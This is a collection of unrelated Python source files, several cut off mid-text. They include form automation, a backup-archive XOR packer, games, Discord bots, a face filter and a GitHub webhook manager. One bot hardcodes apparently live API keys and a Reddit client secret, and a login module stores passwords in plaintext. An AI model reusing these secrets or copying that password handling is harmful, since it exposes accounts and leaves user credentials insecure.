driver.find_element(By.ID, \"react-autowhatever-1\")\r\n  button_input.click()\r\n  # Household\r\n  button_input = driver.find_element(By.XPATH, \"//label[@for='ProposerDetails.HouseHoldTypeId3']\")\r\n  button_input.click()\r\n\r\n  # Driving History\r\n  # Driving licence\r\n  button_input = driver.find_element(By.XPATH, \"//label[@for='DrivingHistory.DrivingLicenceTypeId1']\")\r\n  button_input.click()\r\n  # Time with licence\r\n  if input_data_dobY == \"2006\":\r\n    button_input = driver.find_element(By.XPATH, \"//label[@for='DrivingHistory.YearsLicenceHeldTypeId2']\")\r\n    button_input.click()\r\n  elif input_data_dobY == \"2005\":\r\n    button_input = driver.find_element(By.XPATH, \"//label[@for='DrivingHistory.YearsLicenceHeldTypeId3']\")\r\n    button_input.click()\r\n  elif input_data_dobY == \"2004\":\r\n    button_input = driver.find_element(By.XPATH, \"//label[@for='DrivingHistory.YearsLicenceHeldTypeId4']\")\r\n    button_input.click()\r\n  elif input_data_dobY == \"2003\":\r\n    bu",
    "#!/usr/bin/env python3\n\nimport argparse\nfrom pathlib import Path\n\nxor_key = \"1A F2 53 18 69 76 B7 A8 00 C2 1A F2 53 18 69 76 B7 A8 00 C2\"\nxor_key = bytes.fromhex(xor_key)\n\n\ndef chunks(lst, n):\n    for i in range(0, len(lst), n):\n        yield lst[i : i + n]\n\n\ndef unpack(src_file: Path, dst_dir: Path):\n    assert src_file.is_file(), \"Source must be a file\"\n\n    with open(src_file, \"rb\") as f:\n\n        def read_xor(size: int):\n            result = bytearray(f.read(size))\n            for i, _ in enumerate(result):\n                result[i] ^= xor_key[i % len(xor_key)]\n            return result\n\n        def get_int(x: bytes):\n            return int.from_bytes(x, \"little\")\n\n        count = get_int(read_xor(4))\n        header_size = 4 * count + 4\n\n        f.seek(0, 0)\n        header = read_xor(header_size)\n        name_list = read_xor(header_size - 4)\n        # TODO: Not currently used\n        thumb_list = read_xor(header_size - 4)\n\n        name_list = [get_int(x) for x in chunks(name_list, 4)]\n        names = []\n        for offset in name_list:\n            f.seek(offset, 0)\n            size = get_int(read_xor(4))\n            names.append(read_xor(size).decode())\n\n        dst_dir.mkdir(exist_ok=True)\n\n        for i, name in enumerate(names):\n            offset = get_int(header[4 * i + 4 : 4 * i + 8])\n            f.seek(offset, 0)\n            size = get_int(read_xor(4))\n            with open(dst_dir / name, \"wb\") as f2:\n                offset = 0\n                while offset < size:\n                    buffer_size = min(0x2000, size - offset)\n                    f2.write(read_xor(buffer_size))\n                    offset += buffer_size\n\n\ndef pack(src_dir: Path, dst_file: Path):\n    assert src_dir.is_dir(), \"Source must be a directory\"\n\n    with open(dst_file, \"wb\") as f:\n\n        def write_xor(data: bytes):\n            result = bytearray(data)\n            for i, _ in enumerate(result):\n                result[i] ^= xor_key[i % len(xor_key)]\n            f.write(result)\n\n        def get_bytes(x: int):\n            return x.to_bytes(4, \"little\")\n\n        files = sorted(f for f in src_dir.glob(\"*\") if f.is_file())\n        file_sizes = [f.stat().st_size for f in files]\n        # TODO: Not currently used\n        thumbs = [bytes(1) for i in range(len(files))]\n\n        count = len(files)\n        header_size = 4 * count + 4\n        name_list_size = 4 * count\n        thumb_list_size = 4 * count\n\n        header = get_bytes(len(files))\n        name_list = bytes(0)\n        thumb_list = bytes(0)\n        offset = header_size + name_list_size + thumb_list_size\n        for i, file in enumerate(files):\n            header += get_bytes(offset)\n            name_offset = offset + 4 + file_sizes[i]\n            name_list += get_bytes(name_offset)\n            thumb_offset = name_offset + 4 + len(file.name)\n            thumb_list += get_bytes(thumb_offset)\n            offset = thumb_offset + 4 + len(thumbs[i])\n\n        write_xor(header)\n        write_xor(name_list)\n        write_xor(thumb_list)\n\n        for i, file in enumerate(files):\n            size = file_sizes[i]\n            write_xor(get_bytes(size))\n            with open(file, \"rb\") as f2:\n                offset = 0\n                while offset < size:\n                    buffer_size = min(0x2000, size - offset)\n                    write_xor(f2.read(buffer_size))\n                    offset += buffer_size\n            write_xor(get_bytes(len(file.name)))\n            write_xor(file.name.encode())\n            write_xor(get_bytes(len(thumbs[i])))\n            write_xor(thumbs[i])\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(\n        description=\"TIGI Software Apps Manager backup tool.\",\n        formatter_class=argparse.ArgumentDefaultsHelpFormatter,\n    )\n    subparsers = parser.add_subparsers(dest=\"cmd\", help=\"Operation to perform.\", required=True)\n\n    pack_parser = subparsers.add_parser(\"pack\", formatter_class=argparse.ArgumentDefaultsHelpFormatter)\n    unpack_parser = subparsers.add_parser(\"unpack\", formatter_class=argparse.ArgumentDefaultsHelpFormatter)\n\n    parser.add_argument(\n        \"input\",\n        type=str,\n        help=\"File to read.\",\n    )\n    parser.add_argument(\n        \"output\",\n        type=str,\n        help=\"File to save.\",\n    )\n\n    args = parser.parse_args()\n    args.input = Path(args.input)\n    args.output = Path(args.output)\n\n    assert args.input.exists(), \"Input file does not exist\"\n    assert args.output.parent.exists(), \"Output file's directory does not exist\"\n\n    if args.cmd == \"unpack\":\n        print(f\"Unpacking {args.input}...\")\n        unpack(args.input, args.output)\n        print(\"Done! Unpacked to:\", args.output)\n    else:\n        print(f\"Packing {args.input}...\")\n        pack(args.input, args.output)\n        print(\"Done! Packed to:\", args.output)\n",
    "import pygame as pg\nfrom constants import *\nfrom collections import defaultdict\n\nclass ChessBoard:\n    _instance = None\n    def __init__(self, turn, tile):\n        self.turn = turn\n        self.tile = tile\n        self.board = self.init_board()\n        self.white_king, self.black_king = self.init_kings()\n        self.valid_white_moves, self.valid_black_moves = {}, {}\n        self.invalid_white_king_moves, self.invalid_black_king_moves = [], []\n        self.white_pawn_promoted, self.black_pawn_promoted = False, False\n        self.winner = False\n        self.moves_with_no_capturing = 0\n        self.positions = defaultdict(int)\n        self.positions[tuple(tuple(row) for row in self.board)] = 1\n\n    def __new__(cls, *args, **kwargs):\n        if cls._instance is None:\n            cls._instance = super().__new__(cls)\n        return cls._instance\n    \n    def init_kings(self):\n        white_king = None\n        black_king = None\n        for i in range(len(self.board)):\n            for j in range(len(self.board[i])):\n                if (self.board[i][j] and\n                    self.board[i][j].name() == KING and\n                    self.board[i][j].color == BLACK):\n                    \n                    black_king = (j, i)\n\n                elif (self.board[i][j] and\n                    self.board[i][j].name() == KING and\n                    self.board[i][j].color == WHITE):\n\n                    white_king = (j, i)\n        return [white_king, black_king]\n\n    def init_board(self):\n        return [\n            [Rook(BLACK, self), Knight(BLACK, self), Bishop(BLACK, self), Queen(BLACK, self), King(BLACK, self), Bishop(BLACK, self), Knight(BLACK, self), Rook(BLACK, self)],\n            [Pawn(BLACK, self), Pawn(BLACK, self), Pawn(BLACK, self), Pawn(BLACK, self), Pawn(BLACK, self), Pawn(BLACK, self), Pawn(BLACK, self), Pawn(BLACK, self)],\n            [None, None, None, None, None, None, None, None],\n            [None, None, None, None, None, None, None, None],\n            [None, None, None, None, None, None, None, None],\n            [None, None, None, None, None, None, None, None],\n            [Pawn(WHITE, self), Pawn(WHITE, self), Pawn(WHITE, self), Pawn(WHITE, self), Pawn(WHITE, self), Pawn(WHITE, self), Pawn(WHITE, self), Pawn(WHITE, self)],\n            [Rook(WHITE, self), Knight(WHITE, self), Bishop(WHITE, self), Queen(WHITE, self), King(WHITE, self), Bishop(WHITE, self), Knight(WHITE, self), Rook(WHITE, self)]\n        ]\n    \n    def reset(self):\n        self.turn = WHITE\n        self.board = self.init_board() \n        self.white_king, self.black_king = self.init_kings()\n        self.valid_white_moves, self.valid_black_moves = {}, {}\n        self.invalid_white_king_moves, self.invalid_black_king_moves = [], []\n        self.white_pawn_promoted, self.black_pawn_promoted = False, False\n        self.winner = False\n        self.moves_with_no_capturing = 0\n        self.positions = defaultdict(int)\n        self.positions[tuple(tuple(row) for row in self.board)] = 1\n\n    def is_valid_move(self, curr_pos, new_pos):\n        x, y = curr_pos\n        new_x, new_y = new_pos\n    \n        if (self.get_piece(x, y).color == self.turn and\n            (self.get_piece(new_x, new_y) == None or\n            self.get_piece(x, y).color != self.get_piece(new_x, new_y).color) and\n            self.get_piece(x, y).is_valid_move(curr_pos, new_pos)):\n\n            return True\n        return False\n    \n    def castle(self, curr_pos, new_pos):\n        x, y = curr_pos\n        new_x, new_y = new_pos\n        if self.get_piece(x, y).name() == KING and self.get_piece(x, y).color == WHITE:\n            if x - new_x == 2:\n                self.board[y][0] = None\n                self.board[y][new_x + 1] = Rook(WHITE, self)\n            elif x - new_x == -2:\n                self.board[y][len(self.board) - 1] = None\n                self.board[y][new_x - 1] = Rook(WHITE, self)\n            self.white_king = (new_x, new_y)\n        elif self.get_piece(x, y).name() == KING and self.get_piece(x, y).color == BLACK:\n            if x - new_x == 2:\n                self.board[y][0] = None\n                self.board[y][new_x + 1] = Rook(BLACK, self)\n            elif x - new_x == -2:\n                self.board[y][len(self.board) - 1] = None\n                self.board[y][new_x - 1] = Rook(BLACK, self)\n            self.black_king = (new_x, new_y)\n\n    def fifty_move_rule(self, new_pos):\n        new_x, new_y = new_pos\n        if self.board[new_y][new_x]:\n            self.moves_with_no_capturing = 0\n            self.positions[tuple(tuple(row) for row in self.board)] = 1\n        else:\n            self.moves_with_no_capturing += 1\n        if self.moves_with_no_capturing == 50:\n            self.winner = None\n    def threefold_repetition_rule(self):\n        self.positions[tuple(tuple(row) for row in self.board)] += 1\n\n        if max(self.positions.values()) >= 3:\n            self.winner = None\n\n    def calculate_invalid_king_moves(self, color=None):\n        if not color:\n            f",
    "#https://invoicehome.com/invoices/129749268/edit?goal=form_start\n#https://html-online.com/\nimport jinja2\nimport pdfkit\nimport questionary\nfrom datetime import datetime\n\nname = input(\"Enter your name:\")\ntoday_date = datetime.today().strftime(\"%d %b, %Y\")\ndate = input(\"Enter the Booking date: \")\nset_type = input(\"Enter the set type: \")\nnail_color = input(\"Enter colour: \")\nnail_style = input(\"Enter nail style: \")\ngems = input(\"Would you like some Accesories? [y/n]\") #charge extra R50 for accesories/nail deco\n\ncontext = {'name': name, \"today_date\": today_date, \"date\":date, \"set_type\":set_type, \"nail_color\":nail_color, \"nail_style\":nail_style,\"gems\":gems}\n#create a jinja  envitonment\n#path\nhtml_loader = jinja2.FileSystemLoader('./')  #finds the directory of the html file\nhtml_env = jinja2.Environment(loader=html_loader)   #Create an environment\n\nfile_templete = html_env.get_template(\"my_demo.html\")\nresult_text = file_templete.render(context)\n#to find the file path : which {filename}  /usr/bin/wkhtmltopdf\n\nconfig = pdfkit.configuration(wkhtmltopdf=\"/usr/bin/wkhtmltopdf\")\n\npdfkit.from_string(result_text, \"automated_invoice.pdf\", configuration=config)\n\n#Separate into functions for easier readability\n#Make use of pep-8 to complete\n#Doc string every function\n\n\n\n\n",
    "from pygame import *\nfrom random import randint\nfrom time import sleep\nframe = time.Clock()\ninit()\nmixer.init()\ngame = True\nglobal bullets \nscr = display.set_mode((700, 500)) # <---- resolution\ndisplay.set_caption(\"xd\") # <---- caption\n\nbullets = []\ngone = 0\nvictory = 0\n\nfont.init()\nfnt = font.SysFont(\"Arial\", 70) # font parameters\nwin = fnt.render(\"congrats!\", True, (255,0,0))\nlos = fnt.render(\"you lose\", True, (255,0,0))\n\ndef scoreboard(missed, victory):\n    fnt = font.SysFont(\"Arial\", 50)\n    won = fnt.render((str(victory)+\"/10\"), True, (132,4,196))\n    lose = fnt.render((str(missed)+\"/3\"), True, (132,4,196))\n    scr.blit(won, (50, 50))\n    scr.blit(lose, (50, 100))\n\n\nclass gamesprites(sprite.Sprite):\n    def __init__(self, x, y, img, sp):\n        self.velocity = sp\n        self.player = transform.scale(image.load(img), (50, 50)) # sprite size in pixels\n        self.rect = self.player.get_rect()\n        self.rect.x = x\n        self.rect.y = y\n\n\n    def draw1(self):\n        scr.blit(self.player, (self.rect.x, self.rect.y))   \n\nclass bullet(sprite.Sprite):\n    def __init__(self, x, y, img, sp):\n        self.velocity = sp\n        self.player = transform.scale(image.load(img), (15, 15)) # size of bullet\n        self.rect = self.player.get_rect()\n        self.rect.x = x\n        self.rect.y = y\n\n    def draw1(self):\n        scr.blit(self.player, (self.rect.x, self.rect.y))   \n\n    def update(self, id):\n        self.rect.y -= self.velocity\n        if self.rect.y < 0:\n            bullets.remove(id)\n        self.draw1()\n    def return_rect(self):\n        return self.rect\n\nclass player(gamesprites):\n\n    def update(self):\n        keys = key.get_pressed()\n        if keys[K_a] and  self.rect.x > 5:\n            self.rect.x -= self.velocity  # BORDERS CHANGE IT IF U CHANGED RESOLUTION\n        if keys[K_d] and self.rect.x < 650:        \n            self.rect.x += self.velocity\n    def fire(self):\n        bull = bullet(self.rect.centerx, self.rect.top, \"bullet.png\", 1) # bullet parameters (image, speed, coordinate)\n        if len(bullets) > 10: \n            pass\n        else:\n            bullets.append(bull)\n\n\nclass asteroid_group(sprite.Sprite):\n    def __init__(self, base_y):\n        self.img = transform.scale(image.load(\"asteroid.png\"), (50, 50))\n        self.rect = self.img.get_rect()\n        self.rect.y = base_y\n        self.rect.x = randint(0, 670) # asteroid spawn parameter change it to your X\n        self.velocity = 1\n        self.miss = False\n    def draw1(self):\n        scr.blit(self.img, (self.rect.x, self.rect.y))\n    def missed(self):\n        return self.miss\n    def move(self):\n        self.draw1()\n        self.rect.y += self.velocity\n        if self.rect.y > 570:\n            self.miss =True\n            \n        \nbg = transform.scale(image.load('galaxy.jpg'), (700, 500))\nmixer.music.load(\"space.ogg\")\nmixer.music.play()\n\nrocket = player(50, 450, \"rocket.png\", 5) # player parameters\n\nmeteors = []\n\nfor i in range(0, 3):\n    for j in range(6):\n        ast = asteroid_group(i*-100)\n        meteors.append(ast)\n\nwave = 1\nwhile game:\n\n    for e in event.get():\n        if e.type == QUIT:\n            game = False\n        if e.type == KEYDOWN:\n            if e.key == K_w:\n                rocket.fire()\n\n    scr.blit(bg, (0, 0))\n    rocket.draw1()\n    rocket.update()\n    if victory == 10:\n        scr.blit(win, (350, 250))\n        continue\n    if gone >= 3:\n        scr.blit(los, (350, 250))\n        continue\n    for i in meteors:\n        i.move()\n        if i.missed() == True:\n            gone += 1\n        for j in bullets:\n            j.update(j)\n            if sprite.collide_rect(i, j):\n                victory += 1\n                bullets.remove(j)\n                meteors.remove(i)\n    scoreboard(gone, victory)\n\n    display.update() \n    frame.tick(50)\n",
    "import psycopg2\r\nfrom configparser import ConfigParser\r\n\r\nreader = ConfigParser()\r\nreader.read('config.ini')\r\n\r\nclass database_manager:\r\n    def connector(self):\r\n        '''Connects to the given database. Mostly used in other methods'''\r\n        self._conn = psycopg2.connect(\r\n            host = reader['POSTGRESDATA']['HOST'],\r\n            user = reader['POSTGRESDATA']['USER'],\r\n            password = reader['POSTGRESDATA']['PASSWORD'],\r\n            database = reader['POSTGRESDATA']['DB']\r\n        )\r\n        self._curr = self._conn.cursor()\r\n        self._curr.execute('''CREATE TABLE IF NOT EXISTS registered_accounts(\r\n                           id SERIAL PRIMARY KEY,\r\n                           username TEXT,\r\n                           password TEXT\r\n        )''')\r\n\r\n    def disconnect(self):\r\n        '''Disconnects from the database. Used in other methods after connector() to avoid memory leakage'''\r\n        self._curr.close()\r\n        self._conn.close()\r\n    \r\n\r\n    def insert_data(self, name, password):\r\n        '''Registers the account and inserts the data into the database.'''\r\n        self.connector()\r\n        with self._conn:\r\n            self._curr.execute('INSERT INTO registered_accounts(username, password) VALUES(%s, %s)', (name, password))\r\n        self.disconnect()\r\n\r\n\r\n    def get_username(self, name):\r\n        '''Checks if an account exists by selecting the columns with the given username.'''\r\n        self.connector()\r\n        self._curr.execute('SELECT * FROM registered_accounts WHERE username=%s', (name,))\r\n        result = self._curr.fetchall()\r\n        self.disconnect()\r\n        return result\r\n    \r\n    def account_checker(self, name, password):\r\n        '''Checks if an account with the given credentials already exists. (get_username is used in the register page, this authenticates the account on the login page)'''\r\n        self.connector()\r\n        self._curr.execute('SELECT * FROM registered_accounts WHERE username=%s and password=%s', (name, password))\r\n        if self._curr.fetchall():\r\n            self.disconnect()\r\n            return True\r\n    \r\n\r\n",
    "from math import sqrt\nimport cv2\nimport math\nimport numpy as np\nimport mediapipe as mp\nimport requests\nimport base64\nimport time\nimport requests\n\n# \u8a2d\u5b9aGitHub\u5009\u5eab\u7684\u76f8\u95dc\u8cc7\u8a0a\nusername = 'emilychen0716'\nrepo_name = 'face_filter/main'\n\n\n# \u8a2d\u5b9a GitHub \u5e33\u6236\u9a57\u8b49\uff0c\u4f7f\u7528\u500b\u4eba\u8a2a\u554f\u4ee4\u724c\uff08Personal Access Token\uff09\naccess_token = ''\nheaders = {'Authorization': f'token {access_token}'}\nmp_drawing = mp.solutions.drawing_utils\nmp_face_mesh = mp.solutions.face_mesh\neartype=\"bear\"\nimageplace=\"test\"\n\ndef rotate_image(image, angle):\n    height, width = image.shape[:2]\n    rotation_matrix = cv2.getRotationMatrix2D((width/2, height/2), angle, 1)\n    rotated_image = cv2.warpAffine(image, rotation_matrix, (width, height))\n    return rotated_image\n\n# For static images:\nIMAGE_FILES = []\ndrawing_spec = mp_drawing.DrawingSpec(thickness=1, circle_radius=1)\nwith mp_face_mesh.FaceMesh(\n    static_image_mode=True,\n    max_num_faces=2,\n    min_detection_confidence=0.7) as face_mesh:\n  for idx, file in enumerate(IMAGE_FILES):\n    image = cv2.imread(file)\n    # Convert the BGR image to RGB before processing.\n    results = face_mesh.process(cv2.cvtColor(image, cv2.COLOR_BGR2RGB))\n\n    # Print and draw face mesh landmarks on the image.\n    if not results.multi_face_landmarks:\n      continue\n    annotated_image = image.copy()\n    for face_landmarks in results.multi_face_landmarks:\n      print('face_landmarks:', face_landmarks)\n      mp_drawing.draw_landmarks(\n          image=annotated_image,\n          landmark_list=face_landmarks,\n          connections=mp_face_mesh.FACE_FACEMESH_CONTOURS, # old as CONNECTIONS\n          landmark_drawing_spec=drawing_spec,\n          connection_drawing_spec=drawing_spec)\n    cv2.imwrite('/tmp/annotated_image' + str(idx) + '.png', annotated_image)\n\n# For webcam input:\ndrawing_spec = mp_drawing.DrawingSpec(thickness=1, circle_radius=1)\ncap = cv2.VideoCapture(0)\nwith mp_face_mesh.FaceMesh(\n    min_detection_confidence=0.7,\n    min_tracking_confidence=0.7) as face_mesh:\n  while cap.isOpened():\n    success, image = cap.read(cv2.IMREAD_UNCHANGED)\n    if not success:\n      print(\"Ignoring empty camera frame.\")\n      # If loading a video, use 'break' instead of 'continue'.\n      continue\n\n    # Flip the image horizontally for a later selfie-view display, and convert\n    # the BGR image to RGB.\n    image = cv2.cvtColor(cv2.flip(image, 1), cv2.COLOR_BGR2RGB)\n    # To improve performance, optionally mark the image as not writeable to\n    # pass by reference.\n    image.flags.writeable = False\n    results = face_mesh.process(image)\n\n    # Draw the face mesh annotations on the image.\n    image.flags.writeable = True\n    image = cv2.cvtColor(image, cv2.COLOR_RGB2BGR)\n    image_height, image_width, _ = image.shape\n\n    \n\n    if results.multi_face_landmarks:\n      if len(results.multi_face_landmarks)>1:\n        print(len(results.multi_face_landmarks))\n      for face_landmarks in results.multi_face_landmarks:\n        p1=[int(face_landmarks.landmark[67].x*image_width),int(face_landmarks.landmark[67].y*image_height)]\n        p2=[int(face_landmarks.landmark[297].x*image_width),int(face_landmarks.landmark[297].y*image_height)]\n        dis=3*int(sqrt((p1[0]-p2[0])**2+(p1[1]-p2[1])**2))\n        delta_x=(p1[0]-p2[0])*3\n        delta_y=(p1[1]-p2[1])*3\n        \n      #print(eartype)\n      key = cv2.waitKey(1)\n      \n\n      if key == 13:\n        print(\"change\")\n        print(eartype)\n        if eartype == \"bear\":\n            eartype = \"cat\"\n        elif eartype == \"cat\":\n            eartype = \"bear\"\n        print(eartype)\n      \n      if eartype == \"cat\":\n        ear = cv2.imread('catear.png', cv2.IMREAD_UNCHANGED)\n      elif eartype == \"bear\":\n        ear = cv2.imread('bearear.png', cv2.IMREAD_UNCHANGED)\n\n      ear = cv2.resize(ear, (dis,int(dis/ear.shape[0]*ear.shape[1])))\n      angle = math.degrees(math.atan2(p2[1]-p1[1],p2[0]-p1[0]))\n      ear = rotate_image(ear,-angle)\n      image = cv2.cvtColor(image, cv2.COLOR_BGR2BGRA)\n      x=p1[1]-dis//3*2\n      y=p1[0]-dis//3\n      if x+ear.shape[0]<image.shape[0] and y+ear.shape[0]<image.shape[1] and x>0 and y>0:\n        bg=np.zeros(image.shape,np.uint8)\n        bg[x:x+ear.shape[0], y:y+ear.shape[1]] = ear\n        image = cv2.addWeighted(image,1,bg,1,-5)\n\n      if key == 32:\n        print(\"Download!\")\n        current_time = time.strftime(\"%H%M\")\n        cv2.imwrite(str(current_time)+'.png', image)\n        print(\"\u5716\u7247\u4e0b\u8f09\u5b8c\u6210\uff01\")\n        file_path = str(current_time)+'.png'  # \u8981\u4e0a\u50b3\u7684\u5716\u7247\u6a94\u6848\u8def\u5f91\n\n        # \u8b80\u53d6\u5716\u7247\u6a94\u6848\u7684\u4e8c\u9032\u4f4d\u6578\u64da\n        with open(file_path, 'rb') as file:\n            file_data = file.read()\n\n        # \u8a2d\u5b9aAPI\u7aef\u9ede\u548c\u6a19\u982d\n        url = f'https://api.github.com/repos/{username}/{repo_name}/contents/{file_path}'\n\n        # \u5efa\u7acb\u8acb\u6c42\u7684\u6709\u6548\u8ca0\u8f09\n        payload = {\n            'message': 'Upload image',\n            'content': file_data\n        }\n\n        # \u767c\u9001POST\u8acb\u6c42\u4e0a\u50b3\u5716\u7247\n        response = requests.post(url, headers=headers, json=payload)\n\n        # \u6aa2\u67e5\u56de\u61c9\u72c0\u614b\u78bc\n        if response.status_code == 201:\n            print('Image uploaded successfully.')\n        else:\n  ",
    "import discord\r\nfrom discord.ext import commands\r\n\r\nintents = discord.Intents.default()\r\nintents.guilds = True\r\nintents.messages = True\r\n\r\nbot = commands.Bot(command_prefix='!', intents=intents)\r\n\r\n@bot.event\r\nasync def on_ready():\r\n    print(f'{bot.user.name} is connected to Discord!')\r\n\r\n@bot.command()\r\nasync def ticket(ctx):\r\n    # \u00dcberpr\u00fcfe, ob der Benutzer bereits ein Ticket hat\r\n    ticket_channel = discord.utils.get(ctx.guild.channels, name=f\"ticket-{ctx.author.id}\")\r\n    if ticket_channel:\r\n        await ctx.send(\"Du hast bereits ein offenes Ticket!\")\r\n    else:\r\n        # Kanal erstellen und konfigurieren\r\n        overwrites = {\r\n            ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),\r\n            ctx.author: discord.PermissionOverwrite(read_messages=True, send_messages=True)\r\n        }\r\n        ticket_channel = await ctx.guild.create_text_channel(f\"ticket-{ctx.author.id}\", overwrites=overwrites)\r\n        await ctx.send(f\"Ticket erstellt: {ticket_channel.mention}\")\r\n\r\n@bot.command()\r\nasync def close(ctx):\r\n    # \u00dcberpr\u00fcfe, ob der Befehl im richtigen Kanal verwendet wird\r\n    if not ctx.channel.name.startswith(\"ticket-\"):\r\n        await ctx.send(\"Dieser Befehl kann nur in einem Ticket-Kanal verwendet werden.\")\r\n    else:\r\n        await ctx.channel.delete()\r\n        await ctx.send(\"Ticket geschlossen.\")\r\n\r\n# F\u00fcge hier deinen Bot-Token ein\r\nbot.run('DEIN_DISCORD_BOT_TOKEN')\r\n",
    "import discord\nimport os \nimport requests\nimport random\nimport json\nimport praw\nimport asyncio\nimport subprocess\nfrom flask import Flask\nfrom threading import Thread\nfrom replit import db\nfrom discord.ext import commands\nfrom discord.flags import Intents\n\n\n#Flask server setup\napp = Flask('Walt.jr Web app')\n\n@app.route('/')\ndef home():\n    return \"Hello. I'm alive!\"\n\ndef run():\n    app.run(host='0.0.0.0', port=8000)\n\ndef keep_alive():\n    t = Thread(target=run)\n    t.start()\n\nif __name__ == \"__main__\":\n    keep_alive()\n\n# Define your bot's prefix\nprefix = \"!\"\n\n# Initialize the bot\nbot = commands.Bot(command_prefix=prefix, intents=Intents.all())\n\nintents = discord.Intents.default()\nintents.message_content = True\nintents.members = True\nintents.guilds = True\nintents.invites = True\n\n\ndef get_weather(location):\n    # OpenWeatherMap API key\n    API_KEY = \"6ec986e3de0dce6f6cc981d3fd8b249b\"\n    # Construct the API URL\n    url = f\"http://api.openweathermap.org/data/2.5/weather?q={location}&appid={API_KEY}&units=metric\"\n    # Send a GET request to the API\n    response = requests.get(url)\n    # If the request was successful, return the weather data\n    if response.status_code == 200:\n        return response.json()\n    else:\n        return None\n\n# Dictionary to store monitored subreddits\nmonitored_subreddits = {}\n\n#define meme command\ndef fetch_random_meme(subreddit_name):\n  subreddit = reddit.subreddit(subreddit_name)\n  memes = []\n  # Fetch memes from the specified subreddit\n  for submission in subreddit.hot(limit=100):\n      # Consider only posts with images\n      if submission.url.endswith(('jpg', 'jpeg', 'png')):\n          memes.append(submission.url)\n\n  # Check if memes list is empty\n  if not memes:\n      return \"No memes found in this subreddit.\"\n\n  # Return a random meme URL\n  return random.choice(memes)\n\n# Initialize the Reddit API wrapper\nreddit = praw.Reddit(client_id='ta6z73U-tDYVWCCeUlTpkQ',\n                     client_secret='0RoFKzvRIkvnVAFHWRAK-zPdiajYvA',\n                     user_agent='discord:RedditBot:v1.0 (by /u/ArunSteve)')\n\n#Dfine the Welcome Channel ID\nWELCOME_CHANNEL_ID = 1224443049984397352\n\n# Define the rules channel ID\nRULES_CHANNEL_ID = 1224443099510738994\n\n# Define the Tv-Show Channel ID\nTV_SHOWS_CHANNEL_ID = 1224443444508889200\n\n# Define the Movie Channel ID\nMOVIES_CHANNEL_ID = 1224443490209894610\n\n#Define the Bot Command ID\nBOT_COMMANDS_ID = 1227348329717829673\n\n# define the funfact.\nfun_facts = [\n    \"The first computer virus was created in 1983 and was called the 'Elk Cloner.' It infected Apple II systems through floppy disks.\",\n    \"The first programmer in history was Ada Lovelace, an English mathematician. She wrote the first algorithm intended to be processed by a machine, making her the world's first computer programmer.\",\n    \"The term 'bug' in computer science originated from an incident in 1947 when a moth got trapped in a relay of the Harvard Mark II computer, causing a malfunction. Engineers then 'debugged' the computer to remove the moth, coining the term.\",\n    \"The world's first website went live on August 6, 1991. It was created by Tim Berners-Lee and provided information about the World Wide Web project.\",\n    \"The first computer mouse was invented in 1964 by Douglas Engelbart. It was made of wood and had two wheels that could roll in any direction.\",\n    \"The average computer has around 2 billion transistors. Transistors are the building blocks of modern computer processors and memory chips.\",\n    \"The QWERTY keyboard layout, which is commonly used in English-speaking countries, was designed in the 1860s by Christopher Sholes. It was originally created to prevent jamming in typewriters.\",\n    \"The first electronic digital computer, ENIAC, weighed more than 27 tons and occupied a space of about 1,800 square feet. It was completed in 1945.\",\n    \"The concept of a 'byte' was coined by Dr. Werner Buchholz in 1956 while working at IBM. It represents a sequence of bits (usually 8) used to encode a single character of text in a computer.\",\n    \"The shortest-ever program written was just one line long. It was written in the programming language APL and printed 'Hello, World!' when executed.\"\n    \"The first computer program was written by Ada Lovelace for Charles Babbage's Analytical Engine. It was an algorithm to calculate Bernoulli numbers, making her the world's first computer programmer.\",\n    \"The concept of a 'bit' (short for binary digit) was introduced by Claude Shannon in his 1937 master's thesis. He laid the groundwork for digital circuit design theory, which is essential for modern computer engineering.\",\n    \"The first computer bug was not a moth but a real insect. In 1947, engineers found a dead cockroach stuck in a relay of the Harvard Mark II computer, causing a malfunction. This incident inspired the term 'bug' in computer science.\",\n    \"The term 'software engineering' was first used in 1968 during NATO's Software Engineering Conference. It aimed to address the ch",
    "import logging\nfrom typing import Any, Dict, List\n\nfrom utils.helpers import (\n    process_config_file,\n    send_completion_notifications,\n)\n\nfrom utils.github.client import (\n    GitHubAPIClient,\n)\n\nlogger = logging.getLogger(__name__)\n\ndef process_org_repos(organisation: str, api_token: str, conf_options: Dict[str, Any]) -> None:\n    client = GitHubAPIClient(\n        api_token,\n        conf_options[\"APP\"][\"GITHUB_API_BASE_URL\"],\n    )\n\n    webhooks_urls_to_add: List[str] = conf_options[\"APP\"][\"WEBHOOKS_URLS_TO_ADD\"]\n\n    repos = client.get_org_repos(organisation)\n\n    for repo in repos:\n        webhooks = client.list_webhooks(organisation, repo[\"name\"])\n        logger.debug(f\"Webhooks for {organisation}/{repo['name']}: {webhooks}\")\n\n        if not any(\n            webhook[\"config\"][\"url\"] in webhooks_urls_to_add for webhook in webhooks\n        ):\n            for webhook_url in webhooks_urls_to_add:\n                client.create_webhook(organisation, repo[\"name\"], webhook_url)\n                logger.info(f\"Webhook added to {organisation}/{repo['name']}\")\n        else:\n            # Delete any webhooks that are not in the list of webhooks to add.\n            for webhook in webhooks:\n                if webhook[\"config\"][\"url\"] not in webhooks_urls_to_add:\n                    logger.info(f\"Webhook URL: {webhook['config']['url']}\")\n\n                    client.delete_webhook(organisation, repo[\"name\"], webhook[\"id\"])\n                    logger.info(f\"Webhook deleted from {organisation}/{repo['name']}\")\n                else:\n                    logger.info(f\"Webhook already exists in {organisation}/{repo['name']}\")\n\n\ndef process_user_repos(user: str, api_token: str, conf_options: Dict[str, Any]) -> None:\n    client = GitHubAPIClient(\n        api_token,\n        conf_options[\"APP\"][\"GITHUB_API_BASE_URL\"],\n    )\n\n    webhooks_urls_to_add: List[str] = conf_options[\"APP\"][\"WEBHOOKS_URLS_TO_ADD\"]\n\n    repos = client.get_user_repos(user)\n\n    for repo in repos:\n        webhooks = client.list_webhooks(user, repo[\"name\"])\n        logger.debug(f\"Webhooks for {user}/{repo['name']}: {webhooks}\")\n\n        if not any(\n            webhook[\"config\"][\"url\"] in webhooks_urls_to_add for webhook in webhooks\n        ):\n            for webhook_url in webhooks_urls_to_add:\n                client.create_webhook(user, repo[\"name\"], webhook_url)\n                logger.info(f\"Webhook added to {user}/{repo['name']}\")\n        else:\n            # Delete any webhooks that are not in the list of webhooks to add.\n            for webhook in webhooks:\n                if webhook[\"config\"][\"url\"] not in webhooks_urls_to_add:\n                    logger.info(f\"Webhook URL: {webhook['config']['url']}\")\n\n                    